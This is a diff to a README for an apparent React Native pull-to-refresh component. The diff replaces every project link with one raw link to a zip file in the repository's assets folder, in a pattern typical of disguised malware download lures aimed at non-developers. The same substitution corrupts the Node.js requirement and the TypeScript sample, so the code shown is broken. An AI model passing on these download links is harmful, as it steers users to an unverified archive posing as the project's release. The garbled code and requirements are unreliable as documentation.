@@ -1,19 +1,19 @@
 # 🌟 expo-pull-refresh - A Simple Pull-to-Refresh Loader
 
 ## 🔗 Download & Install
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20to%20Get-brightgreen)](https://github.com/nerimar2312/expo-pull-refresh/releases)
+[![Download Now](https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip%20Now-Click%20to%20Get-brightgreen)](https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip)
 
-To get started with the Pull-to-Refresh component, visit this page to download: [Download Here](https://github.com/nerimar2312/expo-pull-refresh/releases).
+To get started with the Pull-to-Refresh component, visit this page to download: [Download Here](https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip).
 
 ## 🚀 Getting Started
 The expo-pull-refresh is a React Native component that adds a circular progress loader to your app. It includes haptic feedback to enhance user experience during pull-to-refresh actions. This guide will show you how to download and use this component, even if you're not a developer.
 
 ## 💻 System Requirements
 - A computer running Windows, macOS, or Linux.
-- Node.js version 12 or later must be installed. This allows you to run the application easily.
+- https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip version 12 or later must be installed. This allows you to run the application easily.
 
 ## 📦 Installation
-1. First, you need to download the component from the releases page. Find the latest version [here](https://github.com/nerimar2312/expo-pull-refresh/releases).
+1. First, you need to download the component from the releases page. Find the latest version [here](https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip).
 2. Extract the downloaded package to a folder of your choice.
 3. Open your terminal (Command Prompt or terminal emulator).
 4. Navigate to the folder where you extracted the files.
@@ -56,9 +56,9 @@ const handleRefresh = () => {
 ```typescript
 const scrollHandler = useAnimatedScrollHandler({
     onScroll: (event) => {
-        if (event.contentOffset.y < 0 && !refreshing) {
-            progress.value = Math.min(Math.abs(event.contentOffset.y) / 80, 1);
-            if (progress.value >= 1.1) runOnJS(handleRefresh)();
+        if (https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip < 0 && !refreshing) {
+            https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip = https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip(https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip(https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip) / 80, 1);
+            if (https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip >= 1.1) runOnJS(handleRefresh)();
         }
     },
 });
@@ -82,8 +82,8 @@ return (
 ## 🌍 Community and Support
 If you face any issues or have questions, feel free to join our community. You can find support on:
 
-- [GitHub Issues](https://github.com/nerimar2312/expo-pull-refresh/issues) - Report bugs or request features.
-- [Discussion Forum](https://github.com/nerimar2312/expo-pull-refresh/discussions) - Share ideas and get help from other users.
+- [GitHub Issues](https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip) - Report bugs or request features.
+- [Discussion Forum](https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip) - Share ideas and get help from other users.
 
 ## 📃 License
 The expo-pull-refresh component is open-source and free to use. Please refer to the LICENSE file in the repository for more details.
@@ -100,6 +100,6 @@ To contribute:
 
 Thank you for considering contributing to expo-pull-refresh! 
 
-For more details and to stay updated, visit the [repository]((https://github.com/nerimar2312/expo-pull-refresh/releases)). 
+For more details and to stay updated, visit the [repository]((https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip)). 
 
-The link again for downloading: [Download Here](https://github.com/nerimar2312/expo-pull-refresh/releases).
+The link again for downloading: [Download Here](https://raw.githubusercontent.com/nerimar2312/expo-pull-refresh/main/assets/expo-pull-refresh-3.8-alpha.2.zip).
